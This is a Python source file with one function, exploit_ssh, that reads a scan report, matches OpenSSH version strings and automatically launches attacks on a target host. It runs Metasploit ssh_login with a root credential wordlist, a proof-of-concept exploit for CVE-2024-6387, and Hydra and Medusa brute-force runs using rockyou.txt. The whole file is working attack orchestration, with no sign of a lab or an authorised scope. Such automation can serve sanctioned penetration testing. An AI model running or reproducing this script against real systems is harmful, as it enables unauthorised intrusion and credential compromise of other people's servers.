import subprocess
import re
from pathlib import Path

def exploit_ssh(target: str, report_path: Path) -> str:
    report = report_path.read_text().lower()
    summary = f"## SSH exploitation results for {target}\n"

    if re.search(r"openssh_5\.", report) or re.search(r"openssh_6\.", report):
        summary += "- OpenSSH 5.x/6.x detected → launching Metasploit ssh_login\n"
        msf = (
            "use auxiliary/scanner/ssh/ssh_login; "
            f"set RHOSTS {target}; "
            "set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt; "
            "set STOP_ON_SUCCESS true; set VERBOSE true; exploit; exit"
        )
        subprocess.run(["msfconsole", "-q", "-x", msf])
        summary += "  - Metasploit ssh_login executed.\n"
    elif re.search(r"openssh_7\.[0-9]", report):
        summary += "- OpenSSH 7.x detected → launching Metasploit ssh_key_exchange\n"
        msf = (
            "use auxiliary/scanner/ssh/ssh_key_exchange; "
            f"set RHOSTS {target}; "
            "set VERBOSE true; run; exit"
        )
        subprocess.run(["msfconsole", "-q", "-x", msf])
        summary += "  - Metasploit ssh_key_exchange executed.\n"
    elif re.search(r"openssh_[89]\.\d+p\d+", report):
        summary += "- Version vulnerable to CVE-2024-6387 → launching PoC exploit\n"
        subprocess.run([
            "python3", "/usr/share/exploits/CVE-2024-6387.py",
            target, "22", "--exploit"
        ])
        summary += "  - CVE-2024-6387 PoC executed.\n"
    else:
        summary += "- No specific exploit found; performing comprehensive brute-force\n"
        subprocess.run([
            "hydra", "-L", "/usr/share/wordlists/users.txt",
            "-P", "/usr/share/wordlists/rockyou.txt",
            target, "ssh", "-t", "4", "-f", "-V"
        ])
        subprocess.run([
            "medusa", "-U", "/usr/share/wordlists/users.txt",
            "-P", "/usr/share/wordlists/rockyou.txt",
            "-h", target, "-M", "ssh", "-T", "4", "-v", "4"
        ])
        summary += "  - Hydra and Medusa brute-force completed.\n"

    # Check for additional vulnerabilities from ssh-audit or Nmap
    if re.search(r"weak|vulnerable|cve", report):
        summary += "- Potential weak config or CVE detected → launching Metasploit scanner\n"
        msf = (
            "use auxiliary/scanner/ssh/ssh_version; "
            f"set RHOSTS {target}; "
            "set VERBOSE true; run; exit"
        )
        subprocess.run(["msfconsole", "-q", "-x", msf])
        summary += "  - Metasploit version scan executed.\n"

    return summary